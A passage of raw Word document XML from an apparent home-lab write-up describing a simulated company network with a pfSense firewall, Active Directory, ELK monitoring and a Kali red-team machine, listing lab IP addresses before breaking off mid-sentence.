      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>by the n</w:t>
      </w:r>
      <w:r w:rsidR="001B455C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ame</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B455C" w:rsidRPr="00944C35">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Laderlapen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B8259F" w:rsidRPr="00944C35" w:rsidRDefault="00F17D28" w:rsidP="00F17D28">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Domain N</w:t>
      </w:r>
      <w:r w:rsidR="00072721" w:rsidRPr="00944C35">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ame: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00072721" w:rsidRPr="00944C35">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>laderlapen.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00E7245A" w:rsidRDefault="00996884" w:rsidP="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:r w:rsidR="00CB5870" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>organization contains 1 main router</w:t>
      </w:r>
      <w:r w:rsidR="00CB5870" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which</w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> will be also firewall</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>PFsense</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="00CB5870" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00072721" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>router</w:t>
      </w:r>
      <w:r w:rsidR="00CB5870" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">network configuration based </w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>on 2 adapters: Bridge</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Internal-Network</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E7245A" w:rsidRDefault="005C2EF5" w:rsidP="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">he firewall </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> access to WAN and also got 2 switches that connect</w:t>
      </w:r>
      <w:r w:rsidR="00F17D28">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s to</w:t>
      </w:r>
      <w:r w:rsidR="00072721">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Internal Networks which wi</w:t>
      </w:r>
      <w:r w:rsidR="00996884">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ll be for the users and servers that separated on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">different </w:t>
      </w:r>
      <w:r w:rsidR="00996884">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>subnets</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E7245A" w:rsidRDefault="005C2EF5">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00996884">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">he users will be part of active directory </w:t>
      </w:r>
      <w:r w:rsidR="00996884" w:rsidRPr="00996884">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>environment</w:t>
      </w:r>
      <w:r w:rsidR="00F17D28">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and on the server</w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">s network we got windows server with active directory installed and configured, and ELK installed and configured </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">so </w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">we will use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>kibana</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">display </w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">all logs </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>all the machines</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> within our network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E7245A" w:rsidRDefault="00921388">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>On a</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ll </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>running machines I’ve installed ELK beats (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>winlogbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sysmon</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>packetbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">) for monitoring and logging in ELK for detection. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F17D28" w:rsidRDefault="00E7245A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">he attacker will be the red team </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>and his goal is to search</w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> for known </w:t>
      </w:r>
      <w:r w:rsidR="00DC1848" w:rsidRPr="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, get access </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">to systems </w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">extract </w:t>
      </w:r>
      <w:r w:rsidR="00DC1848">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>data.</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC1848" w:rsidRDefault="00DC1848" w:rsidP="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The attacker will be on the same adapter as the router, mean</w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the attacker can scan only the firewall </w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">not the </w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">internal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>networks</w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC1848" w:rsidRDefault="00DC1848">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Now</w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> let’s map the network</w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D549E" w:rsidRDefault="006D549E" w:rsidP="00072721">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="001B455C" w:rsidRDefault="00F17D28" w:rsidP="006D549E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Bridge</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F17D28" w:rsidRDefault="00F17D28" w:rsidP="006D549E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC249B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Router</w:t>
      </w:r>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>PFsense</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 10.0.0.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F17D28" w:rsidRDefault="00F17D28" w:rsidP="006D549E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The router will be the main router and firewall of the organization, and network access to WAN.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F17D28" w:rsidRDefault="00F17D28" w:rsidP="006D549E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC249B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Attacker</w:t>
      </w:r>
      <w:r w:rsidR="001E0620">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>(Kali)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 10.0.0.14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F17D28" w:rsidRDefault="00F17D28" w:rsidP="006D549E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The attacker</w:t>
      </w:r>
      <w:r w:rsidR="00EC249B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> will be the red team and he connect also to bridge the same as the router.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00EC249B" w:rsidP="00EC249B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Internal </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Netowrk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Users</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00EC249B" w:rsidP="00EC249B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC249B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Ubuntu 18 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>– 10.10.0.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00EC249B" w:rsidP="00EC249B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">This user will be the manager of the company and he will </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC249B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>not be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> part of active directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00EC249B" w:rsidP="00EC249B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC249B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Windows 10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 10.10.0.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00EC249B" w:rsidP="00EC249B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Name – Peter Parker</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRPr="00CB5870" w:rsidRDefault="00EC249B" w:rsidP="00EC249B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Domain Name – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pparker@laderlapen.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00EC249B" w:rsidP="00F1311E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:r w:rsidR="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> first</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
